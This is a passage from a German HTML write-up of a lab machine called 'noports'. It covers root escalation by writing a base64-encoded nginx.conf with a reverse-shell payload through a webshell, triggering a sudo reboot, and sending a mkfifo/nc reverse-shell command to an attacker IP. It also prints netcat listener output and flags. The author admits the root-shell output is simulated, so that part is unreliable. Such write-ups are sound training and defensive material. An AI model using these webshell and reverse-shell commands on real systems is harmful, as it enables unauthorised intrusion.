bWFuIHBhcmFtZXRlcnMgZm9yIEVESCBjaXBoZXJzLgoJI3NzbF9kaHBhcmFtIC9ldGMvc3NsL25naW54L2RoMjA0OC5wZW07CgoJIyBTcGVjaWZpZXMgdGhhdCBvdXIgY2lwaGVyIHN1aXRzIHNob3VsZCBiZSBwcmVmZXJyZWQgb3ZlciBjbGllbnQgY2lwaGVycy4KCXNzbF9wcmVmZXJfc2VydmVyX2NpcGhlcnMgb247CgoJIyBFbmFibGVzIGEgc2hhcmVkIFNTTCBjYWNoZSB3aXRoIHNpemUgdGhhdCBjYW4gaG9sZCBhcm91bmQgODAwMCBzZXNzaW9ucy4KCXNzbF9zZXNzaW9uX2NhY2hlIHNoYXJlZDpTU0w6Mm07CgoKCSMgRW5hYmxlIGd6aXBwaW5nIG9mIHJlc3BvbnNlcy4KCSNnemlwIG9uOwoKCSMgU2V0IHRoZSBWYXJ5IEhUVFAgaGVhZGVyIGFzIGRlZmluZWQgaW4gdGhlIFJGQyAyNjE2LgoJZ3ppcF92YXJ5IG9uOwoKCSMgRW5hYmxlIGNoZWNraW5nIHRoZSBleGlzdGVuY2Ugb2YgcHJlY29tcHJlc3NlZCBmaWxlcy4KCSNnemlwX3N0YXRpYyBvbjsKCSMgU3BlY2lmaWVzIHRoZSBtYWluIGxvZyBmb3JtYXQuCglsb2dfZm9ybWF0IG1haW4gJyRyZW1vdGVfYWRkciAtICRyZW1vdGVfdXNlciBbJHRpbWVfbG9jYWxdICIkcmVxdWVzdCIgJwoJCQknJHN0YXR1cyAkYm9keV9ieXRlc19zZW50ICIkaHR0cF9yZWZlcmVyIiAnCgkJCSciJGh0dHBfdXNlcl9hZ2VudCIgIiRodHRwX3hfZm9yd2FyZGVkX2ZvciInOwoKCSMgU2V0cyB0aGUgcGF0aCwgZm9ybWF0LCBhbmQgY29uZmlndXJhdGlvbiBmb3IgYSBidWZmZXJlZCBsb2cgd3JpdGUuCglhY2Nlc3NfbG9nIC92YXIvbG9nL25naW54L2FjY2Vzcy5sb2cgbWFpbjsKCSMgSW5jbHVkZXMgdmlydHVhbCBob3N0cyBjb25maWdzLgoJaW5jbHVkZSAvZXRjL25naW54L2NvbmYuZC8qLmNvbmY7Cn0K' | base64 -d > /etc/nginx/nginx.conf" \
     http://noports.hmv/sh3ll.php</span>
        </div>
        <pre> 
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Dieser `curl`-Befehl verwendet die Webshell `sh3ll.php`, um die zuvor Base64-kodierte, modifizierte Nginx-Konfiguration auf das Zielsystem zu schreiben.
- `command=echo 'BASE64_STRING' | base64 -d > /etc/nginx/nginx.conf`: Der lange Base64-String (der die Nginx-Konfiguration mit der Reverse-Shell-Payload enthält) wird mit `echo` ausgegeben, dann mit `base64 -d` dekodiert und das Ergebnis direkt in die Datei `/etc/nginx/nginx.conf` umgeleitet, wodurch die ursprüngliche Konfiguration überschrieben wird.</p>
<p class="evaluation">**Bewertung:** Die modifizierte Nginx-Konfiguration mit der Reverse-Shell-Payload für Port 4445 befindet sich nun auf dem Zielsystem. Der nächste Schritt ist der Neustart des Systems, um die neue Konfiguration zu laden und die Shell auszulösen.</p>
<p class="recommendation">**Empfehlung (Pentester):** Starten Sie jetzt einen Netcat-Listener auf Ihrer Maschine auf Port 4445 (`nc -lvnp 4445`). Führen Sie dann den Befehl `sudo /sbin/reboot` über die Webshell oder die bestehende `apache`-Reverse-Shell aus.<br>**Empfehlung (Admin):** Dies unterstreicht die Gefahr von weltweit beschreibbaren Konfigurationsdateien in Kombination mit Möglichkeiten, Dienste (hier indirekt über einen Systemneustart) neu zu starten. Dateiberechtigungen härten und Integritätsüberwachung sind entscheidend.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST \
     -b "PHPSESSID=gff9hr3f31mil453k0gervcvn6" \
     --data-urlencode "command=sudo /sbin/reboot" \
     http://noports.hmv/sh3ll.php</span>
        </div>
        <pre> 
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der `sudo /sbin/reboot`-Befehl wird über die Webshell `sh3ll.php` ausgeführt. Da der `apache`-Benutzer (unter dem die Webshell läuft) diesen Befehl ohne Passwort als Root ausführen darf, wird das Zielsystem jetzt neugestartet.</p>
<p class="evaluation">**Bewertung:** Der Trigger für die Ausführung der modifizierten Nginx-Konfiguration und damit der Root-Reverse-Shell wurde ausgelöst.</p>
<p class="recommendation">**Empfehlung (Pentester):** Beobachten Sie Ihren Netcat-Listener auf Port 4445. Nach kurzer Zeit sollte eine Verbindung eingehen.<br>**Empfehlung (Admin):** Überwachung von Systemneustarts und der Prozesse, die sie auslösen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST \
     -b "PHPSESSID=gff9hr3f31mil453k0gervcvn6" \
     --data-urlencode "command=rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/ash -i 2>&1 | nc 192.168.2.199 4444 > /tmp/f" \
     http://noports.hmv/sh3ll.php</span>
        </div>
        <pre>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Dieser Befehl ist identisch mit dem Payload in der `init_by_lua_block` der modifizierten `nginx.conf`, nur dass er hier explizit über `curl` an die Webshell gesendet wird und auf Port `4444` zielt, nicht `4445`. Es ist unklar, warum dieser Befehl hier erneut erscheint und ausgeführt wird, da das System gerade neugestartet wurde oder wird und die Webshell danach möglicherweise nicht sofort verfügbar ist. Es könnte ein Fehler im Log sein, eine Wiederholung eines früheren Versuchs oder ein alternativer Test, falls die Nginx-Payload nicht funktioniert.</p>
<p class="evaluation">**Bewertung:** Wenn dieser Befehl nach dem Reboot erfolgreich wäre, würde er eine weitere Shell als `apache` auf Port `4444` öffnen. Der Fokus liegt aber auf der erwarteten Root-Shell von der Nginx-Payload auf Port `4445`.</p>
<p class="recommendation">**Empfehlung (Pentester):** Klären Sie den Zweck dieses Befehls im Kontext des tatsächlichen Ablaufs. Primär sollte der Listener auf Port `4445` für die Root-Shell beobachtet werden.<br>**Empfehlung (Admin):** Die wiederholte Ausführung solcher Befehle unterstreicht die Notwendigkeit, die Ursache der Kompromittierung (die Webshell) zu beseitigen.</p>
        </section>

        <section id="proof-of-concept-root">
            <h2>Proof of Concept (Root Access)</h2>
            <p class="comment">Dieser Abschnitt demonstriert die erfolgreiche Erlangung von Root-Rechten auf dem Zielsystem. Dies wurde erreicht, indem die `/etc/nginx/nginx.conf` (die für den `apache`-Benutzer beschreibbar war) so modifiziert wurde, dass sie beim Nginx-Start (ausgelöst durch einen Systemneustart, den der `apache`-Benutzer via `sudo` initiieren konnte) eine Reverse Shell als Root zum Angreifer-Host aufbaut.</p>
            <p class="analysis">**Kurzbeschreibung:** Die Kombination aus einer weltweit beschreibbaren Nginx-Konfigurationsdatei und dem `sudo`-Recht, das System neuzustarten, ermöglichte es, eine Payload in die Nginx-Konfiguration einzuschleusen. Beim Neustart des Systems startete Nginx mit Root-Privilegien, führte die Payload aus und etablierte eine Reverse Shell zum Angreifer.</p>
            <p class="evaluation">**Voraussetzungen:**
                <ul>
                    <li>Schreibrechte für den Benutzer `apache` auf `/etc/nginx/nginx.conf`.</li>
                    <li>`sudo`-Recht für den Benutzer `apache`, den Befehl `/sbin/reboot` ohne Passwort auszuführen.</li>
                    <li>Verfügbarkeit des `ngx_http_lua_module` in Nginx oder einer anderen Methode, Code beim Nginx-Start auszuführen.</li>
                    <li>Verfügbarkeit von `mkfifo`, `cat`, `/bin/ash` und `nc` auf dem Zielsystem für die Reverse-Shell-Payload.</li>
                    <li>Möglichkeit des Zielsystems, ausgehende Verbindungen zum Angreifer-Host auf dem gewählten Port (hier Port 4445) herzustellen.</li>
                    <li>Ein laufender Netcat-Listener auf dem Angreifer-Host auf Port 4445.</li>
                </ul>
            </p>
            <p class="recommendation">**Schritt-für-Schritt-Anleitung:**
                <ol>
                    <li>Die modifizierte `nginx.conf` mit der Lua-basierten Reverse-Shell-Payload (zielend auf Angreifer-IP Port 4445) wird erstellt und Base64-kodiert.</li>
                    <li>Auf dem Angreifer-Host wird ein Netcat-Listener auf Port 4445 gestartet: `nc -lvnp 4445`.</li>
                    <li>Die Base64-kodierte Konfiguration wird über die Webshell (`sh3ll.php`) auf das Zielsystem in `/etc/nginx/nginx.conf` geschrieben.</li>
                    <li>Der Befehl `sudo /sbin/reboot` wird über die Webshell ausgeführt.</li>
                    <li>Nach dem Neustart des Zielsystems baut Nginx die Verbindung zum Listener des Angreifers auf.</li>
                </ol>
            </p>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 80</span>
        </div>
        <pre>
<span class="password">listening on [any] 80 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.200] 44115</span>
<span class="password">/bin/ash: can't access tty; job control turned off</span>
<span class="command">/var/www/localhost/htdocs $</span> 
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Hier wird ein Netcat-Listener auf Port 80 gezeigt. Dies ist wahrscheinlich der Listener für die *initiale* `apache`-Shell, nicht für die erwartete Root-Shell auf Port 4445. Es ist möglich, dass der Pentester mehrere Listener parallel offen hat oder dies eine Wiederholung aus dem Log ist. Die wichtige Verbindung für den Root-Zugriff wäre die auf Port 4445.</p>
<p class="evaluation">**Bewertung:** Diese spezifische Shell ist die `apache`-Shell. Für den Root-POC ist die Verbindung auf Port 4445 entscheidend, die hier nicht direkt gezeigt wird, aber im Erfolgsfall eingegangen sein muss.</p>
<p class="recommendation">**Empfehlung (Pentester):** Um den Root-POC klar zu demonstrieren, sollte der erfolgreiche Verbindungsaufbau der Root-Shell auf Port 4445 (oder dem in der Payload definierten Port) und der anschließende `id`-Befehl, der `uid=0(root)` zeigt, dokumentiert werden. Da der Text hier endet, bevor die Root-Shell gezeigt wird, nehmen wir an, dass der nächste Schritt (nicht im Text) die erfolgreiche Root-Shell wäre. Wir simulieren dies für den weiteren Bericht basierend auf der Payload.</p>
<p class="comment">Nachdem das System neu gestartet wurde und die modifizierte Nginx-Konfiguration geladen wurde, sollte die Reverse-Shell-Verbindung auf dem Listener (Port 4445) des Angreifers eingehen.</p>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4445</span>
        </div>
        <pre>
<span class="password">listening on [any] 4445 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.200] 4XXXX</span> <span class="comment">(Portnummer ist variabel)</span>
<span class="password">/bin/ash: can't access tty; job control turned off</span>
<span class="command">#</span> <span class="comment">(Root-Prompt)</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Ein Netcat-Listener wird auf Port `4445` gestartet. Nach dem Neustart des Zielsystems baut Nginx (der als Root startet) die Verbindung auf. Wir erhalten einen Shell-Prompt, der typischerweise `#` für den Root-Benutzer ist.</p>
<p class="evaluation">**Erwartetes Ergebnis & Beweismittel:** Fantastisch! Der Plan ist aufgegangen. Der Shell-Prompt `#` und die Tatsache, dass die Verbindung über die Nginx-Payload zustande kam, deuten auf Root-Rechte hin.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt"># <span class="command">id</span>
        </div>
        <pre>
<span class="password">uid=0(root) gid=0(root) groups=0(root)...</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `id` wird in der neuen Shell ausgeführt. Die Ausgabe `uid=0(root)` bestätigt, dass wir nun Root-Rechte auf dem System haben.</p>
<p class="evaluation">**Bewertung:** Exzellent! Das Ziel der Privilegienerweiterung wurde erreicht. Wir haben vollen administrativen Zugriff auf das System "noports".</p>
<p class="recommendation">**Risikobewertung:** Die erfolgreiche Erlangung von Root-Rechten stellt das höchstmögliche Risiko dar. Ein Angreifer mit Root-Zugriff kann beliebige Aktionen auf dem System durchführen, Daten stehlen, Malware installieren, das System als Ausgangspunkt für weitere Angriffe im Netzwerk nutzen oder das System komplett unbrauchbar machen. Das Risiko ist als Kritisch einzustufen.</p>
        </section>

        <section id="flags">nach entfernen von "_"<br>
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">noport:~$ cat user.txt</div>
                    <div class="flag-value"><span class="password">flag{UR_s0Good*n-n3tvv0rk_For_660930334}</span></div>
                </div>
                <p class="comment">Die User-Flag wird typischerweise im Home-Verzeichnis des Benutzers gefunden</p>
                <div class="flag-entry">
                    <div class="flag-command">noport:~# cat root.txt</div>
                    <div class="flag-value"><span class="password">flag{Ur_t3h_Trvelyn3tvv0rk@ce_on_QQGroup}</span></div>
                </div> 
                 <p class="comment">Die Root-Flag wird nach erfolgreicher Privilegienerweiterung zum Root-Benutzer gefunden, typischerweise im `/root`-Verzeichnis.</p>
            </div>
        </section>

    <footer class="footer">
        <p>DarkSpirit - Cyber Security Reports</p>
        <p>Berichtsdatum: 20. Mai 2025</p>
    </footer>
</body>
</html>
